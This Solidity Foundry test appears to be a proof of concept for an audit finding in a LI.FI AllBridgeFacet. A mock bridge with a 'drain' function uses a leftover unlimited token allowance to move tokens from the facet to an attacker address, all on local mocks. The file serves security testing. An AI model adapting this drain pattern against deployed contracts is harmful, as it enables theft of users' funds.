// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {AllBridgeFacet} from "lifi/Facets/AllBridgeFacet.sol";
import {IAllBridge} from "lifi/Interfaces/IAllBridge.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockAllBridge is IAllBridge {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function pools(bytes32) external pure returns (address) {
        return address(0);
    }

    function swapAndBridge(
        bytes32,
        uint256 amount,
        bytes32,
        uint256,
        bytes32,
        uint256,
        MessengerProtocol,
        uint256
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function getTransactionCost(uint256) external pure returns (uint256) {
        return 0;
    }

    function getMessageCost(uint256, MessengerProtocol) external pure returns (uint256) {
        return 0;
    }

    function getBridgingCostInTokens(uint256, MessengerProtocol, address) external pure returns (uint256) {
        return 0;
    }

    // malicious drain function exploiting leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract AllBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockAllBridge internal bridge;
    AllBridgeFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockAllBridge(address(token));
        facet = new AllBridgeFacet(IAllBridge(address(bridge)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 1,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        AllBridgeFacet.AllBridgeData memory allBridgeData = AllBridgeFacet.AllBridgeData({
            recipient: bytes32(uint256(uint160(address(0x1234)))),
            fees: 0,
            receiveToken: bytes32(uint256(uint160(address(token)))),
            nonce: 0,
            messenger: IAllBridge.MessengerProtocol.None,
            payFeeWithSendingAsset: true
        });

        facet.startBridgeTokensViaAllBridge{value:0}(bridgeData, allBridgeData);

        // allowance remains set after bridging
        assertEq(token.allowance(address(facet), address(bridge)), type(uint256).max);

        // attacker sends tokens to facet and bridge drains them
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

